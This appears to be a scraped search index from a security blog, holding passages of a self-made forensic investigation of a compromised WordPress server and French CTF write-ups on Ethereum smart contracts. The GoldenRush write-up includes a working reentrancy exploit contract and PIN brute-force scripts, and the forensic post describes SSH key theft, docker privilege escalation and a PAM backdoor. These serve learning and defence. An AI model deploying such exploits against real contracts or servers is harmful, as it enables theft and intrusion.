/wp-content/themes/my-music-band/assets/js/customize-preview.min.js?ver=20180103 10 /wp-content/themes/my-music-band/assets/js/fitvids.min.js?ver=1.1 10 /wp-content/themes/my-music-band/assets/js/functions.min.js?ver=201800703 10 /wp-content/themes/my-music-band/assets/js/skip-link-focus-fix.min.js?ver=201800703 2 /wp-content/themes/my-music-band/inc/metabox/metabox.js?ver=20180103 2 /wp-content/themes/my-music-band/screenshot.png 10 /wp-content/themes/my-music-band/style.css?ver=5.0.2 2 /wp-content/themes/rock-band/assets/images/header-image.jpg 2 /wp-content/themes/rock-band/screenshot.png 10 /wp-content/themes/rock-band/style.css?ver=5.0.2 10 /wp-content/uploads/2018/12/ironmaiden_band.jpg 5 /wp-content/uploads/2018/12/ironmaiden_eddie.jpg 3 /wp-includes/css/dist/block-library/style.min.css?ver=5.0.2 3 /wp-includes/css/dist/block-library/theme.min.css?ver=5.0.2 2 /wp-includes/fonts/dashicons.eot 2 /wp-includes/js/customize-base.min.js?ver=5.0.2 3 /wp-includes/js/jquery/jquery.js?ver=1.12.4 3 /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 2 /wp-includes/js/tinymce/plugins/compat3x/plugin.min.js?ver=4800-20180716 2 /wp-includes/js/tinymce/tinymce.min.js?ver=4800-20180716 2 /wp-includes/js/underscore.min.js?ver=1.8.3 3 /wp-includes/js/wp-a11y.min.js?ver=5.0.2 3 /wp-includes/js/wp-embed.min.js?ver=5.0.2 3 /wp-includes/js/wp-emoji-release.min.js?ver=5.0.2 4 /wp-login.php Now, let’s exclude WordPress files, they really seem to be legit and up to date (for the moment). And let me add some displayed data: $ cat access.log.swp | awk '{print $1 $6 $7}' | sort | uniq -c | grep -v 'wp' | grep -v ' 1 ' 2 127.0.0.1\"GET/test.php 3 192.168.122.158\"GET/ 2 192.168.122.158\"GET/favicon.ico 3 192.168.122.158\"HEAD/ 5 192.168.122.1\"GET/ 3 192.168.122.1\"GET/favicon.ico 2 192.168.122.1\"GET/index.php/2018/12/27/eddie-the-head/ 3 192.168.122.1\"POST/test.php The IPs for test.php do not seem to come ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:5:2","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Reverse shell Knowing the entry point (test.php) makes easier to understand why Monique rushed to the WordPress administration page (wp-admin): webserver $ cat access.log | grep 158 | grep -A 4 test.php | grep -v -E \"DirBuster|Nmap\" [...] 192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] \"POST /test.php HTTP/1.1\" 200 927 \"http://192.168.122.216/test.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" 192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] \"GET /favicon.ico HTTP/1.1\" 404 506 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" 192.168.122.158 - - [27/Dec/2018:20:52:48 +0100] \"GET /wp-admin/ HTTP/1.1\" 302 410 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" 192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] \"GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F\u0026reauth=1 HTTP/1.1\" 200 3608 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" 192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] \"GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1\" 200 28983 \"http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F\u0026reauth=1\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" Since there is only one user on the website (eddiethehead), it’s not really hard to guess with which account Monique logged in. Going down a little bit in the log file, something caught my attention: webserver $ cat access.log | less -N [...] 2778 192.168.122.158 - - [27/Dec/2018:20:53:18 +0100] \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 431 \"http://192.168.122.216/wp-admin/theme-editor.php\" \"Mozilla/5.0 (X 2778 11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" 2779 ::1 - - [27/Dec/2018:20:53:24 +0100] \"OPTIONS * HTTP/1.0\" 200 126 \"-\" \"Apache/2.4.25 (Debian) (internal dummy connection)\" 2780 192.168.122.158 - - [27/Dec/2018:20:53:25 +0100] \"GET /wp-admin/theme-editor.php?file=inc%2Fcustomizer.php\u0026theme=rock-band HTTP/1.1\" 200 11888 \"http://192.168.122.2 2780 16/wp-admin/theme-editor.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\" [...] The web page theme-editor, its name is explicit. With Odie we wonder why Monique edited the WordPress theme. She doesn’t like Iron Maiden? Odie followed the URL found in the log: http://192.168.122.216/wp-admin/theme-editor.php?file=inc%2Fcustomizer.php\u0026theme=rock-band At the very first view, nothing really awful over there. But Monique edited a PHP web page: customizer.php. We can hypothesize that the evil hacker injects arbitrary PHP code in this page in order to get access on the Debian server. Unfortunately, Monique removed her arbitrary code before leaving, so no proof… Even in the memory dump, there doesn’t seem to be much: $ cat pfile_list| grep \"rock-band\" ---------------- 0x0 /bin/bin/var/www/html/wp-content/languages/themes/rock-band-fr_FR.mo 532630 0xffff979692ed5948 /bin/bin/var/www/html/wp-content/themes/rock-band 532646 0xffff979692ef9a88 /bin/bin/var/www/html/wp-content/themes/rock-band/functions.php 532639 0xffff979692ef41a8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc ---------------- 0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/customizer.php~ ---------------- 0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ensibssecretproject ---------------- 0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ens 532643 0xffff979692ef5a48 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/override-parent.php 532640 0xffff979692ef45d8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox 532641 0xffff979692ef4a08 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox/metabox.php 532631 0xffff979692ed50e8 /bin/bin/var/www/html/wp-content/themes/rock-band/languages ---------------- 0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/languages/fr_FR.mo I can still see this: customizer.php~ ensibssecretproject T","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:5:3","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Privilege escalation We are starting to get a good look on actions made by Monique. However, there is something strange, what happened between the reverse shell and the backdoor? Monique got an access as www-data, not as root. She must be doing at least one privilege escalation. In fact, we could stop the investigation here. We know where the backdoor is, we know where is the entry point. In principle, if we correct these issues, Monique will no longer be able to get access to the Odie’s VPS. But we’re here to learn things and have fun! Then let’s going further! www-data to odie As we know, www-data got shell access the 27/12/2018 at 21:08:21. In auth.log file, recovered from memory, we can see 10 minutes later an SSH connection using the Odie public key: $ cat auth.log | grep -a '21:1' [...] Dec 27 21:17:09 webserver sshd[21876]: Accepted publickey for odie from 192.168.122.158 port 36436 ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA [...] I assume Odie’s private key was stolen by Monique. She did at least two privilege escalation: www-data -\u003e odie ; odie -\u003e root The first privilege escalation will be hard to find because www-data doesn’t have .bash_history files or other kinds of commands history. But, odie has his bash history, let’s try to find out something useful: $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_bash [...] 419 bash 2018-12-27 18:31:58 UTC+0000 vim wrapper.c 419 bash 2018-12-27 18:32:20 UTC+0000 gcc wrapper.c -o ensibssecretproject 419 bash 2018-12-27 18:32:26 UTC+0000 chmod 6775 ensibssecretproject 419 bash 2018-12-27 18:32:29 UTC+0000 ./ensibssecretproject [...] Odie has put a sticky bit on a binary, it may be a good lead to start digging. $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y \"ensibssecretproject\" \u003e yarascan_ensibssecretproject $ strings ./task.419.0x1598000.vma | grep ensibs chmod 6775 ensibssecretproject mv ensibssecretproject /usr/local/bin/ sudo mv ensibssecretproject /usr/local/bin/ gcc wrapper.c -o ensibssecretproject ./ensibssecretproject ls -la /usr/local/bin/ensibssecretproject Nothing unusual. Maybe a wrong lead? odie to root The second privilege escalation will be easier to find! Let’s take a look at running processes: $ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_psaux \u003e plinux_psaux $ cat plinux_psaux | grep \"0 0\" | grep -v '\\[' 1 0 0 /sbin/init 193 0 0 /lib/systemd/systemd-journald 216 0 0 /lib/systemd/systemd-udevd 324 0 0 /usr/sbin/rsyslogd -n 343 0 0 /usr/sbin/cron -f 344 0 0 /lib/systemd/systemd-logind 371 0 0 /sbin/agetty --noclear tty1 linux 374 0 0 /usr/sbin/sshd -D 393 0 0 /sbin/dhclient -4 -v -pf /run/dhclient.enp1s0.pid -lf /var/lib/dhcp/dhclient.enp1s0.leases -I -df /var/lib/dhcp/dhclient6.enp1s0.leases enp1s0 14659 0 0 /usr/lib/packagekit/packagekitd 14670 0 0 /usr/lib/policykit-1/polkitd --no-debug 16169 0 0 /usr/bin/containerd 16290 0 0 /usr/bin/dockerd -H unix:// 21462 0 0 /usr/sbin/apache2 -k start 22347 0 0 sudo su 22348 0 0 su 22349 0 0 bash 22887 0 0 sudo insmod lime-4.9.0-8-amd64.ko path=/home/odie/memory.dmp format=lime timeout=0 22888 0 0 insmod lime-4.9.0-8-amd64.ko path=/home/odie/memory.dmp format=lime timeout=0 The odie user is in the group of only two processes: webserver $ id uid=1000(odie) gid=1000(odie) groupes=1000(odie),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker) sudo docker Sudoers rights got default configuration, then you need the odie password to run commands as root. The attacker wouldn’t managed to gain root access from sudo. It remains docker. The privilege escalation happened after 21:17:09, it’s the time of SSH key connection of Monique with the odie account: $ cat auth.log | grep -a '21:1' [...] Dec 27 21:17:09 webserver sshd[21876]: Accepted publickey for odie from 192.168.122.158 port 36436 ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA [...]","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:5:4","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Attack scenario According to our analysis, here is the attacker scenario: ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:6:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Action plan Now that we have done a nice analysis, it’s important to mitigate and fix vulnerabilities. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:7:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Remediation Remove or move /var/www/html/test.php and /var/www/html/config_test.php files ; Removing odie from docker group ; Removing the PAM backdoor of Monique and restore the legit PAM mechanism ; Remove old SSH key pair and generate new SSH keys for odie ; Add a password on MySQL user wp_mysql_user ; Allow wp_mysql_user to manage only the WordPress database. ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:7:1","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Improvement Deport logs to avoid their deletion (voluntary or not). Odie is a good student, he listened to all his courses on Splunk. It will be easy for him ; Enable Apache2 POST requests logging ; Store commands runs by www-data ; Change SSH default port ; Install an SSH honeypot on the default port. Conclusion To conclude this article, I really enjoyed doing it, I learned a lot of things, whether it was in blue team or red team. The main problem is that my point of view was completely biased since I was both the attacker and the attacked. I should be looking for someone who attacks a machine, makes a memory dump and sends it to me. Moreover, it’s a new system, which has no experience and no interaction with the internet. This system is completely prevented from external noise. This is why to was so “easy” to find all these artifacts despite the completely poor log configuration. Some omissions like the docker container for privilege escalation are not done on purpose, I really forgot to delete the container! I realized this during the analysis of the memory dump. I hope you will have learned some things as readers, and that it will motivate you to do these kinds of little exercises and write about it :D If you have any questions about this article, advice about the methodology (blue or/and red team) or even just for chatting, feel free to contact me on Twitter: Maki Twitter. Finally, I would like to be clear about the history between Monique and Odie. After all of that, Monique has stopped annoying Odie. They even going to see Aquaman together this weekend! They lived happily ever after and had many children! :) ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:7:2","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Posts"],"content":"Ressources Nick CONGLETON, How to Install a LAMP Server on Debian 9 Stretch Linux. 21/02/2018. Linux Config: https://linuxconfig.org/how-to-install-a-lamp-server-on-debian-9-stretch-linux Nick CONGLETON, How to Install WordPress on Debian 9 Stretch Linux. 30/06/2017. Linux Config: https://linuxconfig.org/how-to-install-wordpress-on-debian-9-stretch-linux xfkxfk@, SSRF To RCE in MySQL. 23/01/2018. Seebug paper: https://paper.seebug.org/510/ Guilherme “k33r0k” Assmann, ISITDTU CTF 2018 - Friss Writeup. 29/07/2018. FireShell Security team: https://fireshellsecurity.team/isitdtu-friss/ Officiel PHP website, escapeshellarg. PHP: http://php.net/manual/fr/function.escapeshellarg.php HollyGraceful, Custom Rules for John the Ripper. 14/09/2015. GracefulSecurity: https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/ PentestMonkey, Reverse Shell Cheat Sheet. PentestMonkey: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet RopNop, Upgrading simple shells to fully interactive TTYs. 10/07/2017. RopNop blog: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ Python official website, Command lind and environment, Python officiel website: https://docs.python.org/2/using/cmdline.html#envvar-PYTHONINSPECT Chris Foster, Privilege escalation via Docker. 22/04/2015. fosterelli: https://fosterelli.co/privilege-escalation-via-docker.html Mitsurugi, Creating a backdoor in PAM in 5 line of code. 16/06/2016. Mitsurugi blog: http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html Zephrax, linux-pam-backdoor. 2016. GitHub: https://github.com/zephrax/linux-pam-backdoor 504ensibsLabs, LiME ~ Linux Memory Extractor. 2018. GitHub: https://github.com/504ensicsLabs/LiME Maki, Volatility docker. 2018. GitLab: https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility huntergregal, Mimipenguin beta-2.0. 2018. GitHub: https://github.com/huntergregal/mimipenguin gleeda, Linux command reference. 20/12/2017. Volatility GitHub: https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference Wiki, OWASP DirBuster Project. OWASP Wiki: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project Geluchat, Les Server Side Request Forgery : Comment contourner un pare-feu. 16/09/2017. DailySecurity: https://www.dailysecurity.fr/server-side-request-forgery/ Swissky, Server-Side Request Forgery. GitHub: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SSRF%20injection/README.md DFarnier, Débuter WordPress. 01/03/2015. dfarnier: https://dfarnier.fr/base-de-donnees-wordpress-1/?nolazy#les-tables-des-utilisateurs-wp_users-et-wp_usermeta chrisfosterelli, chrisfosterelli/rootplease. 2015. DockerHub: https://hub.docker.com/r/chrisfosterelli/rootplease/ cowrie, Cowrie SSH/Telnet Honeypot. 2018. GitHub: https://github.com/cowrie/cowrie SekioaLab, FastIR Collector Linux. 2017. GitHub: https://github.com/SekoiaLab/Fastir_Collector_Linux ","date":"2019-12-27","objectID":"maki.bzh/realgsmoveinsilencelikelasagna/:8:0","tags":["methodology","blue team","red team","forensic","pentest","web","docker","ssrf","garfield"],"title":"Real Gs move in silence like lasagna","uri":"maki.bzh/realgsmoveinsilencelikelasagna/"},{"categories":["Writeups"],"content":"Level 1 - Donation GoldenRush is a set of challenges based on the Ethereum Blockchain technology where you will have to exploit vulnerable Smart Contracts. Your goal is to steal the money that I sent on it ! https://goldenrush.santhacklaus.xyz Chaque challenge “Golden rush” est un smart contract à déployer sur la blockchain de test “Ropsten network”. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:1:0","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Mise en place de l’environnement Pour faire les challenges de blockchain ou même ceux sur rootme, il faut ajouter l’extension “MetaMask” dans son navigateur: https://metamask.io/ Lorsque l’extension est correctement installée, il faut créer un compte en suivant les étapes de “Create a wallet”; Quand le wallet est créé, il faut passer sur la blockchain “Ropsten Test Network”, une blockchain de test, où les ETH n’ont aucunes valeurs. Pour résoudre les différents challenges, il faudra au minimum 1 ETH dans le wallet. Pour récupérer des ETH: https://faucet.metamask.io/ L’extension va apparaitre et il faudra accepter la transaction. Maintenant qu’il y a au moins 1 ETH dans le wallet, il est temps de valider le challenge. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:1:1","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Etat des lieux On commence donc sur la première étape, l’objectif est plutot simple: Voler l’argent du smartcontract. Pour cela, le code Solidity du contrat est donné: pragma solidity \u003e=0.4.22 \u003c0.6.0; contract Donation { uint256 public funds; constructor() public payable{ funds = funds + msg.value; } function() external payable { funds = funds + msg.value; } function getDonationsFromOwner(address _contractOwner) external { require(keccak256(abi.encodePacked(address(this)))==keccak256(abi.encodePacked(_contractOwner))); msg.sender.transfer(funds); funds = 0; } } En lançant l’instance, il y deux informations importantes: L’adresse du contrat ; L’Application Binary Interface (ABI) du contrat, cette ABI sert à décrire le contrat. La fonction du contrat getDonationsFromOwner(address _contractOwner) attend donc une adresse en entrée, va vérifier qu’il s’agit bien de son adresse, et transférer les fonds. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:1:2","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Transférer les ETH Pour dialoguer avec les smartcontract, il existe le site: https://www.myetherwallet.com Qui s’interface vraiment bien avec l’extension MetaMask. Pour commencer à intéragir avec le smart contract du challenge, il faut lui donner l’adresse et son ABI: C’est à ce moment là que myetherwallet sera en mesure de fournir une interface à l’utilisateur pour dialoguer avec le contrat. Pour valider l’épreuve, il suffit de fournir à la fonction getDonationsFromOwner() l’adresse du contrat: 0x87f028059df3638b7184045682978Ed477637D72 Et cliquer sur “Write” pour écrire sur la blockchain. A ce moment, une popup MetaMask va apparaitre pour valider la transaction: Lorsque la transaction est validée et terminée (il est possible de suivre la progression via l’add on MetaMask), il est temps de récupérer le flag: ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:1:3","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Flag SANTA{!!S0Lidi7y_BaSiCs!!} ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:1:4","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Level 2 - Piggybank Event Auteur Challenge Category Points Solves Santhacklaus ch3n4p4n Golden rush 2 Blockchain 200 29 Steal the money stored in the contract. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:2:0","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Etat des lieux Comme pour le premier, on a accès au code Solidity du SmartContract: pragma solidity ^0.4.21; contract PiggyBank { bool public isOwner = false; uint256 public funds; bytes32 private pinHash = 0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c; constructor() public payable { funds = funds + msg.value; } function() external payable { funds = funds + msg.value; } function unlockPiggyBank(uint256 pin) external { if((keccak256(abi.encodePacked(uint8(pin))) == pinHash)){ isOwner = true; } } function withdrawPiggyBank() external { require(isOwner == true); msg.sender.transfer(funds); isOwner = false; funds = 0; } } La fonction withdrawPiggyBank() est donc la fonction qui va transférer les fonds. Cependant, il faut que la variable isOwner soit à “True”. Pour passer cette variable à “True” il faut exécuter la fonction unlockPiggyBank(uint256 pin) avec un pin correspondant au hash keccak256 de “PinHash”. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:2:1","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Méthode 1: Bruteforce all the things (Python mode) Il faut savoir que keccak256 est un SHA3 256, sauf que le SHA3 de hashlib n’est pas du tout le même algo. Pour avoir la bonne fonction de hashage, il faut utiliser la lib python pysha3. #!/usr/bin/python3 import sha3 from ENO import * def sha3_keccak(x): m = sha3.keccak_256() m.update(x) return m.hexdigest() for i in range(256): tmp = sha3_keccak(ntos(i)) if tmp == '7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c': print(i) ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:2:2","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Méthode 2: Bruteforce all the things (JS mode) Au lieu d’éviter de se casser la tête en python pour savoir SHA3 de hashlib est le même que celui utilisé dans les smart contracts, on va prendre les librairies natives utilisé par Solidity. Pour cela, on va télécharger web3-utils en faisant nmp i web3-utils contenant la fonction qui nous intéresse ici qui est soliditySha3. var utils = require(\"web3-utils\"); var key = '0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c'; for (var i = 0; i \u003c 256; i++) { var elt = utils.soliditySha3({type:'uint8',value: i}); if (elt === key) { console.log(\"The key is:\",i); return } } ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:2:3","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Flag 213 Le pin secret est donc 213, il ne reste plus qu’à vérifier l’état de la variable et transférer les fonds. SANTA{N0_M0R3_B4D_R4ND0MN3SS_PL3AZ} ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:2:4","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Level 3 - Gringotts Event Auteur Challenge Category Points Solves Santhacklaus ch3n4p4n Golden rush 3 Blockchain 300 18 Steal the money stored in the contract. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:3:0","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Etat des lieux Voici le code du Smart Contract: pragma solidity \u003e=0.4.22 \u003c0.6.0; contract Gringotts { mapping (address =\u003e uint) public sorceryAllowance; uint public allowancePerYear; uint public startStudyDate; uint public numberOfWithdrawls; uint public availableAllowance; bool public alreadyWithdrawn; constructor() public payable { allowancePerYear = msg.value/10; startStudyDate = now; availableAllowance = msg.value; } modifier isEligible() { require(now\u003e=startStudyDate + numberOfWithdrawls * 365 days); alreadyWithdrawn = false; _; } function withdrawAllowance() external isEligible{ require(alreadyWithdrawn == false); if(availableAllowance \u003e= allowancePerYear){ if (msg.sender.call.value(allowancePerYear)()){ alreadyWithdrawn = true; } numberOfWithdrawls = numberOfWithdrawls + 1; sorceryAllowance[msg.sender]-= allowancePerYear; availableAllowance-=allowancePerYear; } } function donateToSorcery(address sorceryDestination) payable public{ sorceryAllowance[sorceryDestination] += msg.value; } function queryCreditOfSorcery(address sorcerySource) view public returns(uint){ return sorceryAllowance[sorcerySource]; } } On remarque que la vulnérabilité va sûrement se retrouver dans la fonction withdrawAllowance(). En effet, les fonctions donateToSorcery et queryCreditOfSorcery ne font rien de très foufou. En regardant le constructeur, on remarque l’allowance par an est de msg.value/10. L’objectif ici va tout simplement être de s’octroyer le maximum d’allowance que le contrat a. C’est à dire availableAllowance = msg.value; décrit dans le constructeur, en évitant bien sûr d’attendre 10 ans avant de tout récupérer. Pour cela, on va effectuer une attaque de type Reentrancy. Ci-dessous un peu de documentation pour savoir comment ça marche: https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302 https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4 ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:3:1","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Exploitation de la Reentrancy Cette attaque de type reentrancy consiste donc à exécuter la commande msg.sender.call.value(allowancePerYear)() en boucle jusqu’à mettre à 0 la variable availableAllowance. La commande étant un appel externe, la variable alreadyWithdrawn n’aura pas le temps de se mettre à true, nous permettant ainsi de vider le contrat. Pour réaliser cette attaque, on va utiliser le contrat suivant: contract Exploiter { address public challenge3Contract = 0x3C81bC083C26cbeEc62181EA9b4A5933a02eE22b; constructor() public payable { Gringotts contractChallenge3 = Gringotts(challenge3Contract); } function Exploit() public payable { contractChallenge3.withdrawAllowance(); } function () public payable { contractChallenge3.withdrawAllowance(); } } Ce contrat va nous permettre d’appeler une première fois la fonction vulnérable. Lorsque nous arrivons à l’instruction msg.sender.call.value(allowancePerYear)(), la fonction de fallback (fonction sans nom dans notre contrat Exploiter) va entrer en jeu. En effet, l’instruction msg.sender.call.value(allowancePerYear)() va envoyer de l’ether du contrat vulnérable à notre contrat malicieux. Il faut savoir que la fonction de fallback est exécutée à chaque fois que le contrat reçoit de l’ether. Donc à chaque fois que msg.sender.call.value(allowancePerYear)() sera exécuté, la fonction de fallback sera exécuté, créant une boucle infini jusqu’au vidage du contrat. Une fois la fonction Exploit() exécutée, il nous suffit just de récupérer le flag via l’interface. ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:3:2","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":"Le flag Well done ! SANTA{R3eN7r4ncY_f0r_Th3_WiN} ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019goldenrush/:3:3","tags":["santhacklaus","ch3n4p4n","shutdown","ethereum","wallet","smart contract","metamask"],"title":"[Santhacklaus 2019] - Golden rush","uri":"maki.bzh/writeups/santhacklaus2019goldenrush/"},{"categories":["Writeups"],"content":" One of our VIP clients, who wishes to remain anonymous, has apparently been hacked and all their important documents are now corrupted. Can you help us recover the files? We found a strange piece of software that might have caused all of this. MD5 of the file : ccaab91b06fc9a77f3b98d2b9164df8e Fichiers: http://cloud.id-iot.team/s/e2ZgLdHKwMoFQ8x ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/:0:0","tags":["santhacklaus","h25","mathis hammel","cryptography","file format","aes","python"],"title":"[Santhacklaus 2019] - Jacques ! Au secours !","uri":"maki.bzh/writeups/santhacklaus2019jacquiesheerhask/"},{"categories":["Writeups"],"content":"Etat des lieux Cette épreuve commence donc avec une archive zip contenant plusieurs fichiers: Le fichier “READ_THIS.txt” contient un message charmant: We have hacked all your files. Buy 1 BTC and contact us at 